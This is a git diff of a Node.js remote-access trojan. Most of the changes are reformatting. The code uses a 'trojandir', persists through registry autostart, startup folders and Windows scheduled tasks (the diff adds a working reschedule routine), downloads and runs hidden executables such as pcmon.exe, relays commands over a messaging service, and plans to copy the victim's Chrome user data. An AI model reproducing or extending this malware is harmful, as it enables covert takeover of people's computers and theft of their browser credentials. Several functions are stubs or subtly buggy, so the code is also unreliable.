@@ -31,28 +31,33 @@ const util = require("util");
 const ISDEBUG = true;
 
 // { CommandLine:'...', Name:'...', ProcessId:'...' }
-var processlist = null; 
+var processlist = null;
 
 initProcessList()
-.then((result) => {
-    initProcessList();
-    processlist = result;
-})
-.catch((err) => {
-    logmsg(err);
-});
+    .then((result) => {
+        initProcessList();
+        processlist = result;
+    })
+    .catch((err) => {
+        logmsg(err);
+    });
 
 // --- TESTING LIST ---
 // test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
 // test bat, ps1, js, py relay
 
-
 // --- TASKS LIST ---
 
-// ! startup: penetrate --> register autostart in registry, folder locations + register tasks // anchor
-// ! startup: reschedule --> obtain 
-// ! node/pyton relay --> make sure we are able to execute RDP on both of these
+// ! node/python relay --> make sure we are able to execute RDP on both of these
 // ! read/write/parse/retrieve config
+// ! setup RDP --> copy chrome user data directory to trojandir
+//   C:\Users\sebas\AppData\Local\Google\Chrome\User Data to <trojandir>/chrome
+
+// ! startup: penetrate --> register autostart in registry, folder locations + register tasks
+// ! startup: reschedule --> obtain
+// Get-CimInstance Win32_StartupCommand | Format-List *
+// Startup --> C:\Users\sebas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+// Common Startup --> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 
 // --- IMPROVEMENTS ---
 
@@ -472,7 +477,7 @@ class CmdConfig {
         relay: relay,
         install_python: install_python,
         install_node: install_node,
-        cleanup: cleanup
+        cleanup: cleanup,
     };
 
     get dynamicdelay() {
@@ -527,7 +532,8 @@ class CmdConfig {
         if (ispidalive) {
             if (cmdprocess) {
                 let tlaunchprocname = path.basename(this.launchprocname);
-                if ( ! procname.includes(tlaunchprocname) ) { // !TEST!
+                if (!procname.includes(tlaunchprocname)) {
+                    // !TEST!
                     this.launch(cmdlineargs, exitparent);
                     logmsg("finished");
                     return;
@@ -680,17 +686,20 @@ class CmdConfig {
     }
 
     exitramp() {
-        let fpath = path.join(systemstate.trojandir, 'killall');
+        let fpath = path.join(systemstate.trojandir, "killall");
 
-        if ( fileExists(fpath) ) {
-            logmsg('found killall -- exiting');
+        if (fileExists(fpath)) {
+            logmsg("found killall -- exiting");
             process.exit(0);
             return;
         }
 
-        fpath = path.join(systemstate.trojandir, 'reset_' + systemstate.cmdconfig.cmdname );
+        fpath = path.join(
+            systemstate.trojandir,
+            "reset_" + systemstate.cmdconfig.cmdname
+        );
 
-        if ( fileExists(fpath) ) {
+        if (fileExists(fpath)) {
             rmSync(fpath, { force: true });
             process.exit(0);
             return;
@@ -1161,12 +1170,12 @@ function getRandomCode(n) {
 }
 
 function isNullOrWhitespace(str) {
-    if ( ! ( typeof myVariable === 'string') ) // !!!
+    if (!(typeof myVariable === "string"))
+        // !!!
         return false;
 
     return !str || !str.trim();
 }
-
 
 function getCallerName() {
     const originalFunc = Error.prepareStackTrace;
@@ -2361,7 +2370,7 @@ function launchrelay(tenginename, tpubnubr, browsername) {
     logmsg(`launching: ${tenginename}, ${tpubnubr}, ${browsername}`);
 
     if (tenginename == "JS") {
-        tchildp = runnoderelay(tpubnubr); // TODO modify to include browsername // anchor
+        tchildp = runnoderelay(tpubnubr); // TODO modify to include browsername
     } else if (tenginename == "BAT") {
         tchildp = runbatrelay(tpubnubr);
     } else if (tenginename == "PS1") {
@@ -2692,17 +2701,31 @@ function cmdlist() {
 }
 
 // TODO
-function reschedule() {
-    
-    // getTasks
-    // get list of tasks -- compare against configured tasks, if not exist create
-    
+// anchor
+async function reschedule() {
+    let tasknames = taskconfig.tasknames;
+
+    let ptasknames = await getTasks();
+
+    for (let i = 0; i < tasknames.length; i++) {
+        let taskname = tasknames[i];
+
+        if (ptasknames.includes(taskname)) {
+            logmsg(`task {taskname} registered -- pass`);
+        } else {
+            // isTaskActive(taskname) --> check if task is valid/active
+            // if inactive or run resulted in error, delete task and recreate it
+            await createTask(taskname); // TODO only create if task has not run as expected
+        }
+    }
 }
 
 // TODO -- missing implementation
 function penetrate() {
     logmsg("starting");
-    
+
+    reschedule();
+
     // modify registry for startup items
     // copy exe/scripts to startup folders
 
@@ -2732,37 +2755,34 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
 
     // delete entries in windows run box
     // cleanup -- only call if trojandir is full
- 
+
     logmsg("finished");
     process.exit(0);
 }
 
-
 async function invoke_exe(
     exename,
     targs = null,
-    exedirpath = '',//path.dirname(process.argv[1]),
+    exedirpath = "", //path.dirname(process.argv[1]),
     stdoutfunc,
     stderrfunc,
     closefunc,
     async = false
 ) {
     return new Promise((resolve, reject) => {
-        const exePath = path.join(exedirpath??'', exename);
+        const exePath = path.join(exedirpath ?? "", exename);
 
         let child = spawn(exePath, targs, {
             shell: exename.slice(-4) == ".cmd",
             windowsHide: true,
         });
 
-        if ( async )
-            resolve(child);
+        if (async) resolve(child);
 
         child.stdout.on("data", (data) => {
             let text = data.toString();
             logmsg(`stdout: ${text}`);
-            if (stdoutfunc) 
-                stdoutfunc(text);
+            if (stdoutfunc) stdoutfunc(text);
         });
 
         child.stderr.on("data", (data) => {
@@ -2775,16 +2795,15 @@ async function invoke_exe(
         child.on("close", (code) => {
             logmsg(`Child process exited with code ${code}`);
 
-            if ( closefunc ) {
+            if (closefunc) {
                 closefunc(code);
             }
 
-            if ( code === 0 ) {
+            if (code === 0) {
                 resolve(child);
             } else {
                 reject(new Error(`Process exited with code ${code}`));
             }
-
         });
 
         child.on("error", (err) => {
@@ -2801,12 +2820,11 @@ async function retrieve_asset(assetfname, assetdir, localdir) {
         (isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
         assetfname;
     let localpath = null;
-    
-    if ( isNullOrWhitespace(localdir) )
+
+    if (isNullOrWhitespace(localdir))
         localpath = path.join(systemstate.trojandir, assetfname);
     else {
-
-        if ( ! folderExists(localdir) ) {
+        if (!folderExists(localdir)) {
             fs.mkdirSync(systemstate.nodegsdfilesdir, { recursive: true });
         }
 
@@ -3291,8 +3309,8 @@ async function retrieve() {
         "7za.exe",
         "gunite.exe",
         "pcmon.dll",
-        "pcmon.exe", 
-        "pslist.exe"
+        "pcmon.exe",
+        "pslist.exe",
     ];
 
     for (let i = 0; i < assets.length; i++) {
@@ -3325,54 +3343,52 @@ function cleanup() {
     // check if trojandir has hit limits, then execute cleanup
     // remove log files, etc.
     // remove cmdlist_ directories
-
     //   rmSync('./path/to/dir', { recursive: true, force: true });
     //   fs.unlinkSync('./path/to/file.txt');
-
     // *.json
     // *.log
 }
 
 function launch_pcmon_koffi() {
-    const koffi = require('koffi');
+    const koffi = require("koffi");
 
-    let dllpath = path.join(systemstate.pcmondir, 'pcmon.dll');
+    let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
 
-    if ( ! fileExists(dllpath) ) {
-        throw new Error('dll does not exist '+dllpath);
+    if (!fileExists(dllpath)) {
+        throw new Error("dll does not exist " + dllpath);
     }
 
     process.chdir(systemstate.pcmondir);
 
     const lib = koffi.load(dllpath);
-    const pcmon_func = lib.func('__stdcall', 'pcmon_main', 'int', []);
+    const pcmon_func = lib.func("__stdcall", "pcmon_main", "int", []);
     pcmon_func();
 }
 
 async function download_pcmon() {
     // retrieve pcmon.exe, pcmon.dll
 
-    if ( ! folderExists(systemstate.pcmondir) ) {
+    if (!folderExists(systemstate.pcmondir)) {
         fs.mkdirSync(systemstate.pcmondir, { recursive: true });
     }
-    
-    if ( ! systemstate.istpl ) {
-        await retrieve_asset("pcmon.exe",null,systemstate.pcmondir);
+
+    if (!systemstate.istpl) {
+        await retrieve_asset("pcmon.exe", null, systemstate.pcmondir);
         return;
     }
 
-    if ( systemstate.istpl ) 
-        await retrieve_asset("pcmon.dll",null,systemstate.pcmondir);
+    if (systemstate.istpl)
+        await retrieve_asset("pcmon.dll", null, systemstate.pcmondir);
 }
 
 async function pcmon_tpl() {
     let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
 
-    if ( ! fileExists(dllpath) ) {
+    if (!fileExists(dllpath)) {
         await download_pcmon();
 
-        if ( ! fileExists(dllpath) ) {
-            throw new Error('failed to download pcmon.dll');
+        if (!fileExists(dllpath)) {
+            throw new Error("failed to download pcmon.dll");
         }
     }
 
@@ -3381,36 +3397,34 @@ async function pcmon_tpl() {
     } catch (err) {
         logmsg(err);
     }
-
 }
 
 async function pcmon() {
     logmsg("starting");
 
     let pcmoncmd = systemstate.cmdconfig;
-    
-    if ( systemstate.istpl ) {
+
+    if (systemstate.istpl) {
         await pcmon_tpl();
         return;
     }
 
     let exepath = path.join(systemstate.pcmondir, "pcmon.exe");
 
-    if ( ! fileExists(exepath) ) {
+    if (!fileExists(exepath)) {
         await download_pcmon();
 
-        if ( ! fileExists(exepath) ) {
-            throw new Error('failed to download pcmon.exe');
+        if (!fileExists(exepath)) {
+            throw new Error("failed to download pcmon.exe");
         }
     }
-
 
     let killswitch = false;
 
     handleMessage = (msgobj) => {
         let clientjob = msg?.payload ?? null;
 
-        if ( ! clientjob ) {
+        if (!clientjob) {
             throw new Error("unable to extract clientjob");
         }
 
@@ -3435,7 +3449,7 @@ async function pcmon() {
         }
 
         if (!killswitch && !isPidAlive(tcmdpid)) {
-            childp = invoke_exe('pcmon.exe');
+            childp = invoke_exe("pcmon.exe");
         }
     };
 
@@ -3551,13 +3565,12 @@ var taskconfig = {
         return Object.keys(this.taskxmlfuncs);
     },
 
-    'taskxmlfuncs': {
-        'IdleTask':getIdleTaskXMLStr,
-        'RepTask':getRepTaskXMLStr,
-        'TimeTask':getTimeTaskXMLStr,
-        'DailyTask':getDailyTaskXMLStr
+    taskxmlfuncs: {
+        IdleTask: getIdleTaskXMLStr,
+        RepTask: getRepTaskXMLStr,
+        TimeTask: getTimeTaskXMLStr,
+        DailyTask: getDailyTaskXMLStr,
     },
-
 };
 
 async function getTaskDetail() {
@@ -3569,20 +3582,26 @@ async function getTaskDetail() {
 async function getTasks() {
     let tasknames = [];
     let taskstr = null;
-    let ret = await invoke_exe( "schtasks", ["/query", "/fo", "LIST"], null,(stdout) => { taskstr += stdout});
+    let ret = await invoke_exe(
+        "schtasks",
+        ["/query", "/fo", "LIST"],
+        null,
+        (stdout) => {
+            taskstr += stdout;
+        }
+    );
 
-
-    if ( isNullOrWhitespace(taskstr) ) {
-        throw new Error('could not generate task names from schtasks');
+    if (isNullOrWhitespace(taskstr)) {
+        throw new Error("could not generate task names from schtasks");
     }
 
-    const lines = taskstr.split(/\r?\n/); 
+    const lines = taskstr.split(/\r?\n/);
 
-    for ( let i = 0 ; i<lines.length; i++) {
+    for (let i = 0; i < lines.length; i++) {
         let line = lines[i];
-        if ( line.startsWith('TaskName:') ) {
-            let parts = line.split(':');
-            let taskname = parts && parts.length>1 ? parts[1] : '';
+        if (line.startsWith("TaskName:")) {
+            let parts = line.split(":");
+            let taskname = parts && parts.length > 1 ? parts[1] : "";
             taskname = taskname.trim();
             tasknames.push(taskname);
         }
@@ -3592,17 +3611,22 @@ async function getTasks() {
 }
 
 async function createTask(taskname) {
-
-    let taskxmlstr = taskconfig['taskxmlfuncs'][taskname]();
-    let fpath = path.join(systemstate.trojandir, 'owd_' + taskname + '.xml');
+    let taskxmlstr = taskconfig["taskxmlfuncs"][taskname]();
+    let fpath = path.join(systemstate.trojandir, "owd_" + taskname + ".xml");
     fs.writeFileSync(fpath, taskxmlstr, "utf8");
     await exec_schtasks(fpath, taskname);
-
 }
 
 async function exec_schtasks(taskxmlpath, taskname) {
     // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
-    let ret = await invoke_exe( "schtasks", ["/create", "/XML", `"{taskxmlpath}"`, "/tn", `"{taskname}"`, "/F"]);
+    let ret = await invoke_exe("schtasks", [
+        "/create",
+        "/XML",
+        `"{taskxmlpath}"`,
+        "/tn",
+        `"{taskname}"`,
+        "/F",
+    ]);
 }
 
 function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
@@ -3653,7 +3677,7 @@ function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
     return taskxmlstr;
 }
 
-function getRepTaskXMLStr(intaskname,tskxmltime,pexe,args,workdir) {
+function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
     let taskxmlstr = `
         <?xml version="1.0" encoding="UTF-16" ?>
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -3705,7 +3729,7 @@ function getRepTaskXMLStr(intaskname,tskxmltime,pexe,args,workdir) {
     return taskxmlstr;
 }
 
-function getTimeTaskXMLStr(intaskname,timetaskxmltime,pexe,args,workdir) {
+function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
     let taskxmlstr = `
         <?xml version="1.0" encoding="UTF-16"?>
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -3754,7 +3778,7 @@ function getTimeTaskXMLStr(intaskname,timetaskxmltime,pexe,args,workdir) {
     return taskxmlstr;
 }
 
-function getDailyTaskXMLStr(intaskname,pexe,args,workdir) {
+function getDailyTaskXMLStr(intaskname, pexe, args, workdir) {
     let taskxmlstr = `
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
         <RegistrationInfo>
